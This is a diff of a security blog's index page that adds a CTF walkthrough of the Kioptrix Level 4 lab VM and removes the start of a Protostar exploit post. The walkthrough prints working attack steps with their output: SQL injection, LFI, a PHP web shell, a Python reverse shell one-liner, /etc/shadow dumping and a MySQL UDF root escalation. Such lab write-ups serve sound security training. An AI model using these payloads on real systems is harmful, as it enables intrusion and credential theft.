@@ -9,15 +9,21 @@
   <meta name="author" content="Norbert Szetei">
 
   
-  <meta name="description" content="ROT13 1
+  <meta name="description" content="Image: Kioptrix: Level 1.3 (#4) Nmap output: 1
 2
 3
 4
 5
 6
-$ python
-Python 2.7.6 (default, Sep 9 2014, 15:04:36) >>> import codecs
->>> codecs.encode(&#8216;V srry yvxr guvf vf n tbbq cynpr gb &hellip;&#8221;>
+7
+8
+9
+10
+11
+12
+13
+14
+root@kali32:~# nmap 192.168.80.154 -sT Starting Nmap 6.49BETA4 ( https &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -86,6 +92,581 @@ Python 2.7.6 (default, Sep 9 2014, 15:04:36) >>> import codecs
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/08/25/kioptrix-level-4/">Kioptrix: Level 4</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-08-25T18:18:32+02:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>25</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>6:18 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Image: <a href="https://www.vulnhub.com/entry/kioptrix-level-13-4,25/#">Kioptrix: Level 1.3 (#4)</a></p>
+
+<p>Nmap output:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nmap 192.168.80.154 -sT
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-04-26 23:39 CEST
+</span><span class='line'>Nmap scan report for 192.168.80.154
+</span><span class='line'>Host is up (0.0015s latency).
+</span><span class='line'>Not shown: 566 closed ports, 430 filtered ports
+</span><span class='line'>PORT    STATE SERVICE
+</span><span class='line'>22/tcp  open  ssh
+</span><span class='line'>80/tcp  open  http
+</span><span class='line'>139/tcp open  netbios-ssn
+</span><span class='line'>445/tcp open  microsoft-ds
+</span><span class='line'>MAC Address: 00:0C:29:53:2F:A3 (VMware)
+</span><span class='line'>
+</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 2.50 seconds</span></code></pre></td></tr></table></div></figure>
+
+
+<p>There is a member login on the <a href="http://192.168.80.154/index.php">http://192.168.80.154/index.php</a> site, we try the
+following credentials (SQLi):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Username: Administrator
+</span><span class='line'>Password: test' or '1'='1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We logged into member site and after a few seconds found the local file
+inclusion vulnerability. Filtering the <code>etc</code> string could be easily evaded for displaying <code>/etc/passwd</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.80.154/member.php?username=robert
+</span><span class='line'>http://192.168.80.154/member.php?username=../../../../../etc/passwd -> User ../../../../..//passwd
+</span><span class='line'>http://192.168.80.154/member.php?username=../../../../../eetct/passwd -> User ../../../../../et/passwd
+</span><span class='line'>http://192.168.80.154/member.php?username=../../../../../eetctc/passwd -> /../../../../../etc/passwd.php
+</span><span class='line'>http://192.168.80.154/member.php?username=../../../../../eetctc/passwd%00</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# curl "http://192.168.80.154/member.php?username=../../../../../eetctc/passwd%00"
+</span><span class='line'>root:x:0:0:root:/root:/bin/bash
+</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
+</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
+</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
+</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
+</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
+</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
+</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
+</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
+</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
+</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
+</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+</span><span class='line'>dhcp:x:101:102::/nonexistent:/bin/false
+</span><span class='line'>syslog:x:102:103::/home/syslog:/bin/false
+</span><span class='line'>klog:x:103:104::/home/klog:/bin/false
+</span><span class='line'>mysql:x:104:108:MySQL Server,,,:/var/lib/mysql:/bin/false
+</span><span class='line'>sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
+</span><span class='line'>loneferret:x:1000:1000:loneferret,,,:/home/loneferret:/bin/bash
+</span><span class='line'>john:x:1001:1001:,,,:/home/john:/bin/kshell
+</span><span class='line'>robert:x:1002:1002:,,,:/home/robert:/bin/kshell</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>smbmap</code> output reveals:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# smbmap -H 192.168.80.154
+</span><span class='line'>[+] Finding open SMB ports....
+</span><span class='line'>[+] User SMB session establishd on 192.168.80.154...
+</span><span class='line'>[+] IP: 192.168.80.154:445    Name: 192.168.80.154
+</span><span class='line'>  Disk                                                    Permissions
+</span><span class='line'>  ----                                                    -----------
+</span><span class='line'>  print$                                              NO ACCESS
+</span><span class='line'>  IPC$                                                NO ACCESS</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now we try to inject php backdoor. For this purpose, we use our session file.
+The file has a fixed location <code>/var/lib/php5/sess_</code> with the appended session
+cookie name:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00
+</span><span class='line'>
+</span><span class='line'>myusername|s:13:"Administrator";mypassword|s:15:"test' or '1'='1";</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As we can see, the myusername session variable could be used to easily inject our code:</p>
+
+<p>We need to login using these credentials:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Username: &lt;?php system($_REQUEST[cmd]); ?>
+</span><span class='line'>Password: test' or '1'='1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now we have a backdoor, that uses parameter <code>cmd</code>. Digging deeper, we use python to execute reverse shell:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# curl "http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00&cmd=id"
+</span><span class='line'>myusername|s:32:"uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span><span class='line'>";mypassword|s:15:"test' or '1'='1";
+</span><span class='line'>
+</span><span class='line'>root@kali32:~# curl "http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00&cmd=cat%20database.sql"
+</span><span class='line'>myusername|s:32:"CREATE TABLE `members` (
+</span><span class='line'>`id` int(4) NOT NULL auto_increment,
+</span><span class='line'>`username` varchar(65) NOT NULL default '',
+</span><span class='line'>`password` varchar(65) NOT NULL default '',
+</span><span class='line'>PRIMARY KEY (`id`)
+</span><span class='line'>) TYPE=MyISAM AUTO_INCREMENT=2 ;
+</span><span class='line'>
+</span><span class='line'>--
+</span><span class='line'>-- Dumping data for table `members`
+</span><span class='line'>--
+</span><span class='line'>
+</span><span class='line'>INSERT INTO `members` VALUES (1, 'john', '1234');
+</span><span class='line'>";mypassword|s:15:"test' or '1'='1";
+</span><span class='line'>
+</span><span class='line'>root@kali32:/var/www/html# nc -l -p 1234
+</span><span class='line'>/bin/sh: can't access tty; job control turned off
+</span><span class='line'>$ id
+</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span><span class='line'>
+</span><span class='line'>root@kali32:~# curl "http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00&cmd=python+-c+'import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.80.137\",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(\[\"/bin/sh\",\"-i\"\]);'"
+</span><span class='line'>
+</span><span class='line'>$ cat checklogin.php
+</span><span class='line'>&lt;?php
+</span><span class='line'>ob_start();
+</span><span class='line'>$host="localhost"; // Host name
+</span><span class='line'>$username="root"; // Mysql username
+</span><span class='line'>$password=""; // Mysql password
+</span><span class='line'>$db_name="members"; // Database name
+</span><span class='line'>$tbl_name="members"; // Table name
+</span><span class='line'>
+</span><span class='line'>// Connect to server and select databse.
+</span><span class='line'>mysql_connect("$host", "$username", "$password")or die("cannot connect");
+</span><span class='line'>mysql_select_db("$db_name")or die("cannot select DB");
+</span><span class='line'>
+</span><span class='line'>// Define $myusername and $mypassword
+</span><span class='line'>$myusername=$_POST['myusername'];
+</span><span class='line'>$mypassword=$_POST['mypassword'];
+</span><span class='line'>
+</span><span class='line'>// To protect MySQL injection (more detail about MySQL injection)
+</span><span class='line'>$myusername = stripslashes($myusername);
+</span><span class='line'>//$mypassword = stripslashes($mypassword);
+</span><span class='line'>$myusername = mysql_real_escape_string($myusername);
+</span><span class='line'>//$mypassword = mysql_real_escape_string($mypassword);
+</span><span class='line'>
+</span><span class='line'>//$sql="SELECT * FROM $tbl_name WHERE username='$myusername' and password='$mypassword'";
+</span><span class='line'>$result=mysql_query("SELECT * FROM $tbl_name WHERE username='$myusername' and password='$mypassword'");
+</span><span class='line'>//$result=mysql_query($sql);
+</span><span class='line'>
+</span><span class='line'>// Mysql_num_row is counting table row
+</span><span class='line'>$count=mysql_num_rows($result);
+</span><span class='line'>// If result matched $myusername and $mypassword, table row must be 1 row
+</span><span class='line'>
+</span><span class='line'>if($count!=0){
+</span><span class='line'>// Register $myusername, $mypassword and redirect to file "login_success.php"
+</span><span class='line'>  session_register("myusername");
+</span><span class='line'>  session_register("mypassword");
+</span><span class='line'>  header("location:login_success.php?username=$myusername");
+</span><span class='line'>}
+</span><span class='line'>else {
+</span><span class='line'>echo "Wrong Username or Password";
+</span><span class='line'>print('&lt;form method="link" action="index.php">&lt;input type=submit value="Try Again">&lt;/form>');
+</span><span class='line'>}
+</span><span class='line'>
+</span><span class='line'>ob_end_flush();
+</span><span class='line'>?></span></code></pre></td></tr></table></div></figure>
+
+
+<p>Because the mysql instance is running as root user, we have a full access to
+the database. We dump it and use the credentials for ssh login, for example
+with the user <code>john</code>. The <code>lshell</code> is executed, but noticing his <code>.lhistory</code> file,
+bash could be directly executed too. Finally, we set the suid privileges for
+<code>dash</code> using mysql and obtain the root privileges:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+<span class='line-number'>101</span>
+<span class='line-number'>102</span>
+<span class='line-number'>103</span>
+<span class='line-number'>104</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ echo "select * from members" | mysql -u root members
+</span><span class='line'>id    username    password
+</span><span class='line'>1 john    MyNameIsJohn
+</span><span class='line'>2 robert  ADGAdsafdfwt4gadfga==
+</span><span class='line'>
+</span><span class='line'>$ cat /home/john/.lhistory
+</span><span class='line'>?
+</span><span class='line'>help
+</span><span class='line'>echo os.system('/bin/bash')
+</span><span class='line'>exit
+</span><span class='line'>su
+</span><span class='line'>sudo
+</span><span class='line'>?
+</span><span class='line'>scp
+</span><span class='line'>touch hello
+</span><span class='line'>help
+</span><span class='line'>ls /root
+</span><span class='line'>exit
+</span><span class='line'>echo os.system('/bin/bash')
+</span><span class='line'>exit
+</span><span class='line'>
+</span><span class='line'>root@kali32:~# ssh -l john 192.168.80.154
+</span><span class='line'>john@192.168.80.154's password:
+</span><span class='line'>Welcome to LigGoat Security Systems - We are Watching
+</span><span class='line'>== Welcome LigGoat Employee ==
+</span><span class='line'>LigGoat Shell is in place so you  don't screw up
+</span><span class='line'>Type '?' or 'help' to get the list of allowed commands
+</span><span class='line'>john:~$ echo os.system('/bin/bash')
+</span><span class='line'>john@Kioptrix4:~$ id
+</span><span class='line'>uid=1001(john) gid=1001(john) groups=1001(john)
+</span><span class='line'>
+</span><span class='line'>john:~$ mysql -u root
+</span><span class='line'>
+</span><span class='line'>mysql> select sys_exec('cat /etc/shadow > /tmp/a');
+</span><span class='line'>+--------------------------------------+
+</span><span class='line'>| sys_exec('cat /etc/shadow > /tmp/a') |
+</span><span class='line'>+--------------------------------------+
+</span><span class='line'>| NULL                                 |
+</span><span class='line'>+--------------------------------------+
+</span><span class='line'>1 row in set (0.01 sec)
+</span><span class='line'>
+</span><span class='line'>mysql>
+</span><span class='line'>[1]+  Stopped                 mysql -u root
+</span><span class='line'>john@Kioptrix4:~$ cat /tmp/a
+</span><span class='line'>root:$1$5GMEyqwV$x0b1nMsYFXvczN0yI0kBB.:15375:0:99999:7:::
+</span><span class='line'>daemon:*:15374:0:99999:7:::
+</span><span class='line'>bin:*:15374:0:99999:7:::
+</span><span class='line'>sys:*:15374:0:99999:7:::
+</span><span class='line'>sync:*:15374:0:99999:7:::
+</span><span class='line'>games:*:15374:0:99999:7:::
+</span><span class='line'>man:*:15374:0:99999:7:::
+</span><span class='line'>lp:*:15374:0:99999:7:::
+</span><span class='line'>mail:*:15374:0:99999:7:::
+</span><span class='line'>news:*:15374:0:99999:7:::
+</span><span class='line'>uucp:*:15374:0:99999:7:::
+</span><span class='line'>proxy:*:15374:0:99999:7:::
+</span><span class='line'>www-data:*:15374:0:99999:7:::
+</span><span class='line'>backup:*:15374:0:99999:7:::
+</span><span class='line'>list:*:15374:0:99999:7:::
+</span><span class='line'>irc:*:15374:0:99999:7:::
+</span><span class='line'>gnats:*:15374:0:99999:7:::
+</span><span class='line'>nobody:*:15374:0:99999:7:::
+</span><span class='line'>libuuid:!:15374:0:99999:7:::
+</span><span class='line'>dhcp:*:15374:0:99999:7:::
+</span><span class='line'>syslog:*:15374:0:99999:7:::
+</span><span class='line'>klog:*:15374:0:99999:7:::
+</span><span class='line'>mysql:!:15374:0:99999:7:::
+</span><span class='line'>sshd:*:15374:0:99999:7:::
+</span><span class='line'>loneferret:$1$/x6RLO82$43aCgYCrK7p2KFwgYw9iU1:15375:0:99999:7:::
+</span><span class='line'>john:$1$H.GRhlY6$sKlytDrwFEhu5dULXItWw/:15374:0:99999:7:::
+</span><span class='line'>robert:$1$rQRWeUha$ftBrgVvcHYfFFFk6Ut6cM1:15374:0:99999:7:::
+</span><span class='line'>john@Kioptrix4:/etc/samba$
+</span><span class='line'>
+</span><span class='line'>mysql> select sys_exec('chmod +s /bin/dash');
+</span><span class='line'>+--------------------------------+
+</span><span class='line'>| sys_exec('chmod +s /bin/dash') |
+</span><span class='line'>+--------------------------------+
+</span><span class='line'>| NULL                           |
+</span><span class='line'>+--------------------------------+
+</span><span class='line'>1 row in set (0.01 sec)
+</span><span class='line'>
+</span><span class='line'>john@Kioptrix4:~$ /bin/dash
+</span><span class='line'># id
+</span><span class='line'>uid=1001(john) gid=1001(john) euid=0(root) egid=0(root) groups=1001(john)
+</span><span class='line'>
+</span><span class='line'># cd /root
+</span><span class='line'># cat congrats.txt
+</span><span class='line'>Congratulations!
+</span><span class='line'>You've got root.
+</span><span class='line'>
+</span><span class='line'>There is more then one way to get root on this system. Try and find them.
+</span><span class='line'>I've only tested two (2) methods, but it doesn't mean there aren't more.
+</span><span class='line'>As always there's an easy way, and a not so easy way to pop this box.
+</span><span class='line'>Look for other methods to get root privileges other than running an exploit.
+</span><span class='line'>
+</span><span class='line'>It took a while to make this. For one it's not as easy as it may look, and
+</span><span class='line'>also work and family life are my priorities. Hobbies are low on my list.
+</span><span class='line'>Really hope you enjoyed this one.
+</span><span class='line'>
+</span><span class='line'>If you haven't already, check out the other VMs available on:
+</span><span class='line'>www.kioptrix.com
+</span><span class='line'>
+</span><span class='line'>Thanks for playing,
+</span><span class='line'>loneferret</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Because the UDF exploitation is well known for sqlmap, we could solve the challenge also using this tool:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# sqlmap -u http://192.168.80.154/checklogin.php --data="myusername=a&mypassword=a&Submit=Login" --os-cmd 'id' --batch | grep uid
+</span><span class='line'>command standard output:    'uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=33(www-data)'
+</span><span class='line'>
+</span><span class='line'>root@kali32:~# sqlmap -u http://192.168.80.154/checklogin.php --data="myusername=a&mypassword=a&Submit=Login" --os-cmd 'cat /root/congrats.txt' --batch
+</span><span class='line'>...
+</span><span class='line'>[00:13:06] [INFO] the backdoor has been successfully uploaded on '/var/www/' - http://192.168.80.154:80/tmpbborl.php
+</span><span class='line'>do you want to retrieve the command standard output? [Y/n/a] Y
+</span><span class='line'>command standard output:
+</span><span class='line'>---
+</span><span class='line'>Congratulations!
+</span><span class='line'>You've got root.
+</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -2314,1555 +2895,6 @@ using python reverse shell could be more efficient:</p>
 </span><span class='line'>
 </span><span class='line'>-ACID
 </span><span class='line'>facebook: https://facebook.com/m.avinash143</span></code></pre></td></tr></table></div></figure>
-
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/07/06/exploit-exercises-protostar-final-levels/">Exploit-Exercises: Protostar (Final Levels)</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-07-06T08:14:11+02:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>6</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>8:14 am</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/">Exploit-Exercises: Protostar (v2)</a></p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ wget https://raw.githubusercontent.com/73696e65/gdbinit/master/gdb_init.txt --no-check-certificate -O ~/.gdbinit -q</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>Protostar Final0</h2>
-
-<figure class='code'><figcaption><span>final0.c </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &quot;../common/common.c&quot;</span>
-</span><span class='line'>
-</span><span class='line'><span class="cp">#define NAME &quot;final0&quot;</span>
-</span><span class='line'><span class="cp">#define UID 0</span>
-</span><span class='line'><span class="cp">#define GID 0</span>
-</span><span class='line'><span class="cp">#define PORT 2995</span>
-</span><span class='line'>
-</span><span class='line'><span class="cm">/*</span>
-</span><span class='line'><span class="cm"> * Read the username in from the network</span>
-</span><span class='line'><span class="cm"> */</span>
-</span><span class='line'>
-</span><span class='line'><span class="kt">char</span> <span class="o">*</span><span class="nf">get_username</span><span class="p">()</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
-</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">q</span><span class="p">;</span>
-</span><span class='line'>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
-</span><span class='line'>
